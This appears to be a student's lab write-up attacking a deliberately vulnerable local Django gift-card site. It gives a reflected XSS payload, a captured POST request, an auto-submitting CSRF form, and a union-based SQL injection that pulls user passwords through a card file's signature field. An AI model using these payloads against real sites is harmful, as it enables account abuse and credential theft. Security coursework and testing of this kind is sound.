https://docs.djangoproject.com/en/3.2/topics/security/

XSS was found within the gift.html file. Escape characters -Django templates escape specific characters which are particularly dangerous to HTML. 
 <p>Endorsed by {{director|safe}}!</p> 
  director = request.GET.get('director', None)
        if director is not None:
            # KG: Wait, what is this used for? Need to check the template.
<script>alert(1)</script>


http://127.0.0.1:8000/gift.html?director=%3Cscript%3Ealert(1)%3C/script%3E


Part 2- Cross Site request Forgery

While analyzing the views.py file, I noticed that def gift_card_view has an interesting comment regarding the validity of a user.  ( KG: What stops an attacker from making me buy a card for him?)

When exploring the gift functionality, I noticed that it was in line with what I read on Portswigger's website and Owasp's website about csrf:

For csrf to exist there must be three conditions met: 
A relevant action. There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).
Cookie-based session handling. Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.
No unpredictable request parameters. The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.

If we capture the post request after attempting to send a gift card to another user- we can see that the conditions are met 

POST /gift/0 HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8000/gift/0
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://127.0.0.1:8000
Connection: close
Cookie: csrftoken=JeRL4Ewjq2cOdVRiYVHoqp39FU8MVPyb5a5HQeU06UbTn6gyyxrwjQaq9PPzP12r; sessionid=xt7d542kwg6uiw6153f50z1xai2z58xh
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
amount=129&username=test

Interestingly enough, there is no security masures taken here to implement something like a csrfmiddlewaretoken and since this is a post request- it follows the post scenario as mentioned here:
https://owasp.org/www-community/attacks/csrf

So  how do we implement csrf? It is as simple as creating a website for the hacker and tricking the victim to clicking on the link which will then gift to the hacker.
I developed csrf.html poc, served it using python -m SimpleHTTPServer and clicked on the link as the victim
POC here:
<html>
  <body>
    <form action="http://127.0.0.1:8000/gift/0" method="POST">
      <input type="hidden" name="username" value="hacker" />
      <input type="hidden" name="amount" value="127" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>




upon clicking on the csrf.html- we can see the following response made:






For sql injection I first started off by looking through the legacy site code with grep -i “SELECT” *
In this, I found a sql query in views.py

These comments in particular were interesting to me 
# check if we know about card.
        # KG: Where is this data coming from? RAW SQL usage with unkown
        # KG: data seems dangerous.
        
        and the coinciding code was proof 
         card_query = Card.objects.raw('select id from LegacySite_card where data = \'%s\'' % signature) 
        user_cards = Card.objects.raw('select id, count(*) as count from LegacySite_card where LegacySite_card.user_id = %s' % str(request.user.id))
        
        
        
        



https://docs.djangoproject.com/en/3.2/topics/security/


{"merchant_id": "NYU Apparel Card", "customer_id": "test10", "total_value": "9", "records": [{"record_type": "amount_change", "amount_added": 2000,"signature": " "' union SELECT password from LegacySite_user --"}]}